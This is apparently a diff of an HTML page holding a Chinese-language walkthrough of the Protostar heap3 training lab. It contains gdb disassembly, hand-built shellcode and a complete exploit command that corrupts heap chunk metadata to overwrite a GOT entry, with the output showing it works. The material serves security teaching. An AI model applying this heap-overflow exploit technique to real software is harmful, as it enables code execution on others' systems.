-0x080488a9 &lt;main+32&gt;:   call   0x8048ff2 &lt;malloc&gt;
-0x080488ae &lt;main+37&gt;:   mov    DWORD PTR <span class="o">[</span>esp+0x18<span class="o">]</span>,eax
-0x080488b2 &lt;main+41&gt;:   mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,0x20
-0x080488b9 &lt;main+48&gt;:   call   0x8048ff2 &lt;malloc&gt;
-0x080488be &lt;main+53&gt;:   mov    DWORD PTR <span class="o">[</span>esp+0x1c<span class="o">]</span>,eax
-0x080488c2 &lt;main+57&gt;:   mov    eax,DWORD PTR <span class="o">[</span>ebp+0xc<span class="o">]</span>
-0x080488c5 &lt;main+60&gt;:   add    eax,0x4
-0x080488c8 &lt;main+63&gt;:   mov    eax,DWORD PTR <span class="o">[</span>eax<span class="o">]</span>
-0x080488ca &lt;main+65&gt;:   mov    DWORD PTR <span class="o">[</span>esp+0x4<span class="o">]</span>,eax
-0x080488ce &lt;main+69&gt;:   mov    eax,DWORD PTR <span class="o">[</span>esp+0x14<span class="o">]</span>
-0x080488d2 &lt;main+73&gt;:   mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,eax
-0x080488d5 &lt;main+76&gt;:   call   0x8048750 &lt;strcpy@plt&gt;
-0x080488da &lt;main+81&gt;:   mov    eax,DWORD PTR <span class="o">[</span>ebp+0xc<span class="o">]</span>
-0x080488dd &lt;main+84&gt;:   add    eax,0x8
-0x080488e0 &lt;main+87&gt;:   mov    eax,DWORD PTR <span class="o">[</span>eax<span class="o">]</span>
-0x080488e2 &lt;main+89&gt;:   mov    DWORD PTR <span class="o">[</span>esp+0x4<span class="o">]</span>,eax
-0x080488e6 &lt;main+93&gt;:   mov    eax,DWORD PTR <span class="o">[</span>esp+0x18<span class="o">]</span>
-0x080488ea &lt;main+97&gt;:   mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,eax
-0x080488ed &lt;main+100&gt;:  call   0x8048750 &lt;strcpy@plt&gt;
-0x080488f2 &lt;main+105&gt;:  mov    eax,DWORD PTR <span class="o">[</span>ebp+0xc<span class="o">]</span>
-0x080488f5 &lt;main+108&gt;:  add    eax,0xc
-0x080488f8 &lt;main+111&gt;:  mov    eax,DWORD PTR <span class="o">[</span>eax<span class="o">]</span>
-0x080488fa &lt;main+113&gt;:  mov    DWORD PTR <span class="o">[</span>esp+0x4<span class="o">]</span>,eax
-0x080488fe &lt;main+117&gt;:  mov    eax,DWORD PTR <span class="o">[</span>esp+0x1c<span class="o">]</span>
-0x08048902 &lt;main+121&gt;:  mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,eax
-0x08048905 &lt;main+124&gt;:  call   0x8048750 &lt;strcpy@plt&gt;
-0x0804890a &lt;main+129&gt;:  mov    eax,DWORD PTR <span class="o">[</span>esp+0x1c<span class="o">]</span>
-0x0804890e &lt;main+133&gt;:  mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,eax
-0x08048911 &lt;main+136&gt;:  call   0x8049824 &lt;free&gt;
-0x08048916 &lt;main+141&gt;:  mov    eax,DWORD PTR <span class="o">[</span>esp+0x18<span class="o">]</span>
-0x0804891a &lt;main+145&gt;:  mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,eax
-0x0804891d &lt;main+148&gt;:  call   0x8049824 &lt;free&gt;
-0x08048922 &lt;main+153&gt;:  mov    eax,DWORD PTR <span class="o">[</span>esp+0x14<span class="o">]</span>
-0x08048926 &lt;main+157&gt;:  mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,eax
-0x08048929 &lt;main+160&gt;:  call   0x8049824 &lt;free&gt;
-0x0804892e &lt;main+165&gt;:  mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,0x804ac27
-0x08048935 &lt;main+172&gt;:  call   0x8048790 &lt;puts@plt&gt;
-0x0804893a &lt;main+177&gt;:  leave  
-0x0804893b &lt;main+178&gt;:  ret    
-End of assembler dump.
+<div class="highlight"><pre><span></span><code><span class="o">(</span>gdb<span class="o">)</span><span class="w"> </span><span class="nb">set</span><span class="w"> </span>disassembly-flavor<span class="w"> </span>intel
+<span class="o">(</span>gdb<span class="o">)</span><span class="w"> </span>disassemble<span class="w"> </span>main
+Dump<span class="w"> </span>of<span class="w"> </span>assembler<span class="w"> </span>code<span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="k">function</span><span class="w"> </span>main:
+0x08048889<span class="w"> </span>&lt;main+0&gt;:<span class="w">    </span>push<span class="w">   </span>ebp
+0x0804888a<span class="w"> </span>&lt;main+1&gt;:<span class="w">    </span>mov<span class="w">    </span>ebp,esp
+0x0804888c<span class="w"> </span>&lt;main+3&gt;:<span class="w">    </span>and<span class="w">    </span>esp,0xfffffff0
+0x0804888f<span class="w"> </span>&lt;main+6&gt;:<span class="w">    </span>sub<span class="w">    </span>esp,0x20
+0x08048892<span class="w"> </span>&lt;main+9&gt;:<span class="w">    </span>mov<span class="w">    </span>DWORD<span class="w"> </span>PTR<span class="w"> </span><span class="o">[</span>esp<span class="o">]</span>,0x20
+0x08048899<span class="w"> </span>&lt;main+16&gt;:<span class="w">   </span>call<span class="w">   </span>0x8048ff2<span class="w"> </span>&lt;malloc&gt;
+0x0804889e<span class="w"> </span>&lt;main+21&gt;:<span class="w">   </span>mov<span class="w">    </span>DWORD<span class="w"> </span>PTR<span class="w"> </span><span class="o">[</span>esp+0x14<span class="o">]</span>,eax
+0x080488a2<span class="w"> </span>&lt;main+25&gt;:<span class="w">   </span>mov<span class="w">    </span>DWORD<span class="w"> </span>PTR<span class="w"> </span><span class="o">[</span>esp<span class="o">]</span>,0x20
+0x080488a9<span class="w"> </span>&lt;main+32&gt;:<span class="w">   </span>call<span class="w">   </span>0x8048ff2<span class="w"> </span>&lt;malloc&gt;
+0x080488ae<span class="w"> </span>&lt;main+37&gt;:<span class="w">   </span>mov<span class="w">    </span>DWORD<span class="w"> </span>PTR<span class="w"> </span><span class="o">[</span>esp+0x18<span class="o">]</span>,eax
+0x080488b2<span class="w"> </span>&lt;main+41&gt;:<span class="w">   </span>mov<span class="w">    </span>DWORD<span class="w"> </span>PTR<span class="w"> </span><span class="o">[</span>esp<span class="o">]</span>,0x20
+0x080488b9<span class="w"> </span>&lt;main+48&gt;:<span class="w">   </span>call<span class="w">   </span>0x8048ff2<span class="w"> </span>&lt;malloc&gt;
+0x080488be<span class="w"> </span>&lt;main+53&gt;:<span class="w">   </span>mov<span class="w">    </span>DWORD<span class="w"> </span>PTR<span class="w"> </span><span class="o">[</span>esp+0x1c<span class="o">]</span>,eax
+0x080488c2<span class="w"> </span>&lt;main+57&gt;:<span class="w">   </span>mov<span class="w">    </span>eax,DWORD<span class="w"> </span>PTR<span class="w"> </span><span class="o">[</span>ebp+0xc<span class="o">]</span>
+0x080488c5<span class="w"> </span>&lt;main+60&gt;:<span class="w">   </span>add<span class="w">    </span>eax,0x4
+0x080488c8<span class="w"> </span>&lt;main+63&gt;:<span class="w">   </span>mov<span class="w">    </span>eax,DWORD<span class="w"> </span>PTR<span class="w"> </span><span class="o">[</span>eax<span class="o">]</span>
+0x080488ca<span class="w"> </span>&lt;main+65&gt;:<span class="w">   </span>mov<span class="w">    </span>DWORD<span class="w"> </span>PTR<span class="w"> </span><span class="o">[</span>esp+0x4<span class="o">]</span>,eax
+0x080488ce<span class="w"> </span>&lt;main+69&gt;:<span class="w">   </span>mov<span class="w">    </span>eax,DWORD<span class="w"> </span>PTR<span class="w"> </span><span class="o">[</span>esp+0x14<span class="o">]</span>
+0x080488d2<span class="w"> </span>&lt;main+73&gt;:<span class="w">   </span>mov<span class="w">    </span>DWORD<span class="w"> </span>PTR<span class="w"> </span><span class="o">[</span>esp<span class="o">]</span>,eax
+0x080488d5<span class="w"> </span>&lt;main+76&gt;:<span class="w">   </span>call<span class="w">   </span>0x8048750<span class="w"> </span>&lt;strcpy@plt&gt;
+0x080488da<span class="w"> </span>&lt;main+81&gt;:<span class="w">   </span>mov<span class="w">    </span>eax,DWORD<span class="w"> </span>PTR<span class="w"> </span><span class="o">[</span>ebp+0xc<span class="o">]</span>
+0x080488dd<span class="w"> </span>&lt;main+84&gt;:<span class="w">   </span>add<span class="w">    </span>eax,0x8
+0x080488e0<span class="w"> </span>&lt;main+87&gt;:<span class="w">   </span>mov<span class="w">    </span>eax,DWORD<span class="w"> </span>PTR<span class="w"> </span><span class="o">[</span>eax<span class="o">]</span>
+0x080488e2<span class="w"> </span>&lt;main+89&gt;:<span class="w">   </span>mov<span class="w">    </span>DWORD<span class="w"> </span>PTR<span class="w"> </span><span class="o">[</span>esp+0x4<span class="o">]</span>,eax
+0x080488e6<span class="w"> </span>&lt;main+93&gt;:<span class="w">   </span>mov<span class="w">    </span>eax,DWORD<span class="w"> </span>PTR<span class="w"> </span><span class="o">[</span>esp+0x18<span class="o">]</span>
+0x080488ea<span class="w"> </span>&lt;main+97&gt;:<span class="w">   </span>mov<span class="w">    </span>DWORD<span class="w"> </span>PTR<span class="w"> </span><span class="o">[</span>esp<span class="o">]</span>,eax
+0x080488ed<span class="w"> </span>&lt;main+100&gt;:<span class="w">  </span>call<span class="w">   </span>0x8048750<span class="w"> </span>&lt;strcpy@plt&gt;
+0x080488f2<span class="w"> </span>&lt;main+105&gt;:<span class="w">  </span>mov<span class="w">    </span>eax,DWORD<span class="w"> </span>PTR<span class="w"> </span><span class="o">[</span>ebp+0xc<span class="o">]</span>
+0x080488f5<span class="w"> </span>&lt;main+108&gt;:<span class="w">  </span>add<span class="w">    </span>eax,0xc
+0x080488f8<span class="w"> </span>&lt;main+111&gt;:<span class="w">  </span>mov<span class="w">    </span>eax,DWORD<span class="w"> </span>PTR<span class="w"> </span><span class="o">[</span>eax<span class="o">]</span>
+0x080488fa<span class="w"> </span>&lt;main+113&gt;:<span class="w">  </span>mov<span class="w">    </span>DWORD<span class="w"> </span>PTR<span class="w"> </span><span class="o">[</span>esp+0x4<span class="o">]</span>,eax
+0x080488fe<span class="w"> </span>&lt;main+117&gt;:<span class="w">  </span>mov<span class="w">    </span>eax,DWORD<span class="w"> </span>PTR<span class="w"> </span><span class="o">[</span>esp+0x1c<span class="o">]</span>
+0x08048902<span class="w"> </span>&lt;main+121&gt;:<span class="w">  </span>mov<span class="w">    </span>DWORD<span class="w"> </span>PTR<span class="w"> </span><span class="o">[</span>esp<span class="o">]</span>,eax
+0x08048905<span class="w"> </span>&lt;main+124&gt;:<span class="w">  </span>call<span class="w">   </span>0x8048750<span class="w"> </span>&lt;strcpy@plt&gt;
+0x0804890a<span class="w"> </span>&lt;main+129&gt;:<span class="w">  </span>mov<span class="w">    </span>eax,DWORD<span class="w"> </span>PTR<span class="w"> </span><span class="o">[</span>esp+0x1c<span class="o">]</span>
+0x0804890e<span class="w"> </span>&lt;main+133&gt;:<span class="w">  </span>mov<span class="w">    </span>DWORD<span class="w"> </span>PTR<span class="w"> </span><span class="o">[</span>esp<span class="o">]</span>,eax
+0x08048911<span class="w"> </span>&lt;main+136&gt;:<span class="w">  </span>call<span class="w">   </span>0x8049824<span class="w"> </span>&lt;free&gt;
+0x08048916<span class="w"> </span>&lt;main+141&gt;:<span class="w">  </span>mov<span class="w">    </span>eax,DWORD<span class="w"> </span>PTR<span class="w"> </span><span class="o">[</span>esp+0x18<span class="o">]</span>
+0x0804891a<span class="w"> </span>&lt;main+145&gt;:<span class="w">  </span>mov<span class="w">    </span>DWORD<span class="w"> </span>PTR<span class="w"> </span><span class="o">[</span>esp<span class="o">]</span>,eax
+0x0804891d<span class="w"> </span>&lt;main+148&gt;:<span class="w">  </span>call<span class="w">   </span>0x8049824<span class="w"> </span>&lt;free&gt;
+0x08048922<span class="w"> </span>&lt;main+153&gt;:<span class="w">  </span>mov<span class="w">    </span>eax,DWORD<span class="w"> </span>PTR<span class="w"> </span><span class="o">[</span>esp+0x14<span class="o">]</span>
+0x08048926<span class="w"> </span>&lt;main+157&gt;:<span class="w">  </span>mov<span class="w">    </span>DWORD<span class="w"> </span>PTR<span class="w"> </span><span class="o">[</span>esp<span class="o">]</span>,eax
+0x08048929<span class="w"> </span>&lt;main+160&gt;:<span class="w">  </span>call<span class="w">   </span>0x8049824<span class="w"> </span>&lt;free&gt;
+0x0804892e<span class="w"> </span>&lt;main+165&gt;:<span class="w">  </span>mov<span class="w">    </span>DWORD<span class="w"> </span>PTR<span class="w"> </span><span class="o">[</span>esp<span class="o">]</span>,0x804ac27
+0x08048935<span class="w"> </span>&lt;main+172&gt;:<span class="w">  </span>call<span class="w">   </span>0x8048790<span class="w"> </span>&lt;puts@plt&gt;
+0x0804893a<span class="w"> </span>&lt;main+177&gt;:<span class="w">  </span>leave<span class="w">  </span>
+0x0804893b<span class="w"> </span>&lt;main+178&gt;:<span class="w">  </span>ret<span class="w">    </span>
+End<span class="w"> </span>of<span class="w"> </span>assembler<span class="w"> </span>dump.
 </code></pre></div>
 </details>
-<div class="highlight"><pre><span></span><code><span class="o">(</span>gdb<span class="o">)</span> x winner 
-0x8048864 &lt;winner&gt;: 0x83e58955
-<span class="o">(</span>gdb<span class="o">)</span> disassemble 0x8048790
-Dump of assembler code <span class="k">for</span> <span class="k">function</span> puts@plt:
-0x08048790 &lt;puts@plt+0&gt;:    jmp    DWORD PTR ds:0x804b128
-0x08048796 &lt;puts@plt+6&gt;:    push   0x68
-0x0804879b &lt;puts@plt+11&gt;:   jmp    0x80486b0
-End of assembler dump.
-<span class="o">(</span>gdb<span class="o">)</span> x 0x804b128
-0x804b128 &lt;_GLOBAL_OFFSET_TABLE_+64&gt;:   0x08048796
-<span class="o">(</span>gdb<span class="o">)</span> info proc map
-process <span class="m">17219</span>
-<span class="nv">cmdline</span> <span class="o">=</span> <span class="s1">&#39;/opt/protostar/bin/heap3&#39;</span>
-<span class="nv">cwd</span> <span class="o">=</span> <span class="s1">&#39;/opt/protostar/bin&#39;</span>
-<span class="nv">exe</span> <span class="o">=</span> <span class="s1">&#39;/opt/protostar/bin/heap3&#39;</span>
-Mapped address spaces:
+<div class="highlight"><pre><span></span><code><span class="o">(</span>gdb<span class="o">)</span><span class="w"> </span>x<span class="w"> </span>winner<span class="w"> </span>
+0x8048864<span class="w"> </span>&lt;winner&gt;:<span class="w"> </span>0x83e58955
+<span class="o">(</span>gdb<span class="o">)</span><span class="w"> </span>disassemble<span class="w"> </span>0x8048790
+Dump<span class="w"> </span>of<span class="w"> </span>assembler<span class="w"> </span>code<span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="k">function</span><span class="w"> </span>puts@plt:
+0x08048790<span class="w"> </span>&lt;puts@plt+0&gt;:<span class="w">    </span>jmp<span class="w">    </span>DWORD<span class="w"> </span>PTR<span class="w"> </span>ds:0x804b128
+0x08048796<span class="w"> </span>&lt;puts@plt+6&gt;:<span class="w">    </span>push<span class="w">   </span>0x68
+0x0804879b<span class="w"> </span>&lt;puts@plt+11&gt;:<span class="w">   </span>jmp<span class="w">    </span>0x80486b0
+End<span class="w"> </span>of<span class="w"> </span>assembler<span class="w"> </span>dump.
+<span class="o">(</span>gdb<span class="o">)</span><span class="w"> </span>x<span class="w"> </span>0x804b128
+0x804b128<span class="w"> </span>&lt;_GLOBAL_OFFSET_TABLE_+64&gt;:<span class="w">   </span>0x08048796
+<span class="o">(</span>gdb<span class="o">)</span><span class="w"> </span>info<span class="w"> </span>proc<span class="w"> </span>map
+process<span class="w"> </span><span class="m">17219</span>
+<span class="nv">cmdline</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;/opt/protostar/bin/heap3&#39;</span>
+<span class="nv">cwd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;/opt/protostar/bin&#39;</span>
+<span class="nv">exe</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;/opt/protostar/bin/heap3&#39;</span>
+Mapped<span class="w"> </span>address<span class="w"> </span>spaces:
 
-  Start Addr   End Addr       Size     Offset objfile
-  0x8048000  0x804b000     0x3000          <span class="m">0</span>        /opt/protostar/bin/heap3
-  0x804b000  0x804c000     0x1000     0x3000        /opt/protostar/bin/heap3
-  0x804c000  0x804d000     0x1000          <span class="m">0</span>           <span class="o">[</span>heap<span class="o">]</span>
-  0xb7e96000 0xb7e97000     0x1000          <span class="m">0</span>        
-  0xb7e97000 0xb7fd5000   0x13e000          <span class="m">0</span>         /lib/libc-2.11.2.so
-  0xb7fd5000 0xb7fd6000     0x1000   0x13e000         /lib/libc-2.11.2.so
-  0xb7fd6000 0xb7fd8000     0x2000   0x13e000         /lib/libc-2.11.2.so
-  0xb7fd8000 0xb7fd9000     0x1000   0x140000         /lib/libc-2.11.2.so
-  0xb7fd9000 0xb7fdc000     0x3000          <span class="m">0</span>        
-  0xb7fe0000 0xb7fe2000     0x2000          <span class="m">0</span>        
-  0xb7fe2000 0xb7fe3000     0x1000          <span class="m">0</span>           <span class="o">[</span>vdso<span class="o">]</span>
-  0xb7fe3000 0xb7ffe000    0x1b000          <span class="m">0</span>         /lib/ld-2.11.2.so
-  0xb7ffe000 0xb7fff000     0x1000    0x1a000         /lib/ld-2.11.2.so
-  0xb7fff000 0xb8000000     0x1000    0x1b000         /lib/ld-2.11.2.so
-  0xbffeb000 0xc0000000    0x15000          <span class="m">0</span>           <span class="o">[</span>stack<span class="o">]</span>
+<span class="w">  </span>Start<span class="w"> </span>Addr<span class="w">   </span>End<span class="w"> </span>Addr<span class="w">       </span>Size<span class="w">     </span>Offset<span class="w"> </span>objfile
+<span class="w">  </span>0x8048000<span class="w">  </span>0x804b000<span class="w">     </span>0x3000<span class="w">          </span><span class="m">0</span><span class="w">        </span>/opt/protostar/bin/heap3
+<span class="w">  </span>0x804b000<span class="w">  </span>0x804c000<span class="w">     </span>0x1000<span class="w">     </span>0x3000<span class="w">        </span>/opt/protostar/bin/heap3
+<span class="w">  </span>0x804c000<span class="w">  </span>0x804d000<span class="w">     </span>0x1000<span class="w">          </span><span class="m">0</span><span class="w">           </span><span class="o">[</span>heap<span class="o">]</span>
+<span class="w">  </span>0xb7e96000<span class="w"> </span>0xb7e97000<span class="w">     </span>0x1000<span class="w">          </span><span class="m">0</span><span class="w">        </span>
+<span class="w">  </span>0xb7e97000<span class="w"> </span>0xb7fd5000<span class="w">   </span>0x13e000<span class="w">          </span><span class="m">0</span><span class="w">         </span>/lib/libc-2.11.2.so
+<span class="w">  </span>0xb7fd5000<span class="w"> </span>0xb7fd6000<span class="w">     </span>0x1000<span class="w">   </span>0x13e000<span class="w">         </span>/lib/libc-2.11.2.so
+<span class="w">  </span>0xb7fd6000<span class="w"> </span>0xb7fd8000<span class="w">     </span>0x2000<span class="w">   </span>0x13e000<span class="w">         </span>/lib/libc-2.11.2.so
+<span class="w">  </span>0xb7fd8000<span class="w"> </span>0xb7fd9000<span class="w">     </span>0x1000<span class="w">   </span>0x140000<span class="w">         </span>/lib/libc-2.11.2.so
+<span class="w">  </span>0xb7fd9000<span class="w"> </span>0xb7fdc000<span class="w">     </span>0x3000<span class="w">          </span><span class="m">0</span><span class="w">        </span>
+<span class="w">  </span>0xb7fe0000<span class="w"> </span>0xb7fe2000<span class="w">     </span>0x2000<span class="w">          </span><span class="m">0</span><span class="w">        </span>
+<span class="w">  </span>0xb7fe2000<span class="w"> </span>0xb7fe3000<span class="w">     </span>0x1000<span class="w">          </span><span class="m">0</span><span class="w">           </span><span class="o">[</span>vdso<span class="o">]</span>
+<span class="w">  </span>0xb7fe3000<span class="w"> </span>0xb7ffe000<span class="w">    </span>0x1b000<span class="w">          </span><span class="m">0</span><span class="w">         </span>/lib/ld-2.11.2.so
+<span class="w">  </span>0xb7ffe000<span class="w"> </span>0xb7fff000<span class="w">     </span>0x1000<span class="w">    </span>0x1a000<span class="w">         </span>/lib/ld-2.11.2.so
+<span class="w">  </span>0xb7fff000<span class="w"> </span>0xb8000000<span class="w">     </span>0x1000<span class="w">    </span>0x1b000<span class="w">         </span>/lib/ld-2.11.2.so
+<span class="w">  </span>0xbffeb000<span class="w"> </span>0xc0000000<span class="w">    </span>0x15000<span class="w">          </span><span class="m">0</span><span class="w">           </span><span class="o">[</span>stack<span class="o">]</span>
 </code></pre></div>
 </li>
 <li>
 <p>通过 <a href="https://defuse.ca/online-x86-assembler.htm">Online x86 / x64 Assembler and Disassembler</a> 将调用函数 <code>winner</code> 的汇编转换为 shellcode</p>
 <div class="highlight"><pre><span></span><code><span class="c1"># move the address of winner() into eax and call</span>
-mov eax, 0x8048864
-call eax
+mov<span class="w"> </span>eax,<span class="w"> </span>0x8048864
+call<span class="w"> </span>eax
 <span class="c1"># \xB8\x64\x88\x04\x08\xFF\xD0</span>
 </code></pre></div>
 </li>
 </ul>
 <h3 id="exploit_3">Exploit<a class="headerlink" href="#exploit_3" title="Permanent link">&para;</a></h3>
-<div class="highlight"><pre><span></span><code>$ ./heap3 <span class="sb">`</span><span class="nb">echo</span> -ne <span class="s2">&quot;AAAA\xB8\x64\x88\x04\x08\xFF\xD0&quot;</span><span class="sb">`</span> <span class="sb">`</span>python -c <span class="s2">&quot;print(&#39;B&#39; * 36 + &#39;\x65&#39;)&quot;</span><span class="sb">`</span> <span class="sb">`</span>python -c <span class="s2">&quot;print(&#39;C&#39; * 92 + &#39;\xfc\xff\xff\xff&#39; * 2 + &#39;\x1c\xb1\x04\x08\x0c\xc0\x04\x08&#39;)&quot;</span><span class="sb">`</span>
-that wasn<span class="err">&#39;</span>t too bad now, was it? @ <span class="m">1662354454</span>
-Segmentation fault
+<div class="highlight"><pre><span></span><code>$<span class="w"> </span>./heap3<span class="w"> </span><span class="sb">`</span><span class="nb">echo</span><span class="w"> </span>-ne<span class="w"> </span><span class="s2">&quot;AAAA\xB8\x64\x88\x04\x08\xFF\xD0&quot;</span><span class="sb">`</span><span class="w"> </span><span class="sb">`</span>python<span class="w"> </span>-c<span class="w"> </span><span class="s2">&quot;print(&#39;B&#39; * 36 + &#39;\x65&#39;)&quot;</span><span class="sb">`</span><span class="w"> </span><span class="sb">`</span>python<span class="w"> </span>-c<span class="w"> </span><span class="s2">&quot;print(&#39;C&#39; * 92 + &#39;\xfc\xff\xff\xff&#39; * 2 + &#39;\x1c\xb1\x04\x08\x0c\xc0\x04\x08&#39;)&quot;</span><span class="sb">`</span>
+that<span class="w"> </span>wasn<span class="err">&#39;</span>t<span class="w"> </span>too<span class="w"> </span>bad<span class="w"> </span>now,<span class="w"> </span>was<span class="w"> </span>it?<span class="w"> </span>@<span class="w"> </span><span class="m">1662354454</span>
+Segmentation<span class="w"> </span>fault
 </code></pre></div>
 
   <hr>
